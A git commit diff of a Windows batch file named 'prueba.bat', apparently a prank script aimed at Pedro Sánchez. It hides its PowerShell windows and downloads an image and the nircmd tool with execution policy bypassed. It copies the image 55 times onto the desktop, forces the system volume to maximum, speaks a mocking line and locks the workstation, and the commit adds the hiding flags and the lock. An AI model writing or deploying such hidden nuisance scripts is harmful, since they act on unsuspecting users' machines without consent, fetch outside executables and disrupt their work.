77bb1edb8c0dd08a3e0feeda5fbc7c6667ebe014
ahuici <ahuicidelg1@educacion.navarra.es>
2026-01-16 20:30:39 +0100

    Update prueba.bat

--- prueba.bat
+++ prueba.bat
@@ -4,15 +4,17 @@ powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://album.m
 
 start "" "https://album.mediaset.es/eimg/2024/04/26/la-carta-de-pedro-sanchez-y-los-memes-mas-virales-asi-reaccionan-las-redes-a-su-periodo-de-reflexion_047e.jpg"
 
-powershell -Command "for ($i = 1; $i -le 35; $i++) { Copy-Item -Path \"$env:TEMP\pedro.png\" -Destination \"C:\Users\$env:USERNAME\Desktop\pedro$i.png\" }"
+powershell -WindowStyle Hidden -Command "for ($i = 1; $i -le 55; $i++) { Copy-Item -Path \"$env:TEMP\pedro.png\" -Destination \"C:\Users\$env:USERNAME\Desktop\pedro$i.png\" }"
 
 set "NIR=%TEMP%\nircmd.exe"
 
 if not exist "%NIR%" (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile \"$env:TEMP\nircmd.zip\"; Add-Type -AssemblyName System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\nircmd.zip\", \"$env:TEMP\")"
+    powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile \"$env:TEMP\nircmd.zip\"; Add-Type -AssemblyName System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\nircmd.zip\", \"$env:TEMP\")"
 )
 
 "%NIR%" mutesysvolume 0
 "%NIR%" setsysvolume 65535
 
-powershell.exe -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('Pedro Sanchez. Lol. Es mexicano');"
+powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('Pedro Sanchez. Lol. Es mexicano.');"
+
+rundll32.exe user32.dll,LockWorkStation
